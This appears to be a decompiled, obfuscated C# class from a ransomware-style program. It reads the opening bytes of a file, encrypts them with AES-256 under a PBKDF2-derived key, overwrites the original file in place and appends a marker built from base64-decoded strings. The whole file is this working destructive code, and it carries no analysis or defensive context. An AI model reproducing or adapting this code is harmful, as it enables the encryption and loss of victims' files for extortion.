using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace MufMaOSvGyvz
{
	// Token: 0x02000018 RID: 24
	public static class Encryption
	{
		// Token: 0x06000069 RID: 105
		public static byte[] EncryptFile(byte[] byte_0, byte[] byte_1, byte[] byte_2)
		{
			byte[] result = null;
			Rfc2898DeriveBytes rfc2898DeriveBytes = Encryption.DeriveBytes(byte_1, byte_2);
			byte_1 = null;
			GC.Collect();
			using (Aes aes = new AesManaged())
			{
				aes.KeySize = 256;
				aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
				aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
				aes.Padding = PaddingMode.None;
				aes.Mode = CipherMode.CBC;
				using (MemoryStream memoryStream = new MemoryStream())
				{
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
					{
						cryptoStream.Write(byte_0, 0, byte_0.Length);
						cryptoStream.Close();
					}
					result = memoryStream.ToArray();
				}
				rfc2898DeriveBytes.Dispose();
			}
			return result;
		}

		// Token: 0x0600006A RID: 106
		public static Rfc2898DeriveBytes DeriveBytes(byte[] byte_0, byte[] byte_1)
		{
			return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
		}

		// Token: 0x0600006B RID: 107
		public static byte[] ReadFileData(string string_0, int int_0)
		{
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			byte[] array = new byte[int_0];
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}

		// Token: 0x0600006C RID: 108
		public static void WhiteEncryptedFile(string string_0, byte[] byte_0)
		{
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Close();
			fileStream.Dispose();
			byte[] bytes = Encoding.ASCII.GetBytes(MainCore.DecodeBase64(MainCore.LcFYzbWwUuFdZ) + MainCore.DecodeBase64("LQ==") + Convert.ToString(MainCore.tsQtKfDKZIMNuO) + MainCore.DecodeBase64("LQ==")); // LQ== -> -
			using (FileStream fileStream2 = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
			{
				fileStream2.Write(bytes, 0, bytes.Length);
			}
		}
	}
}
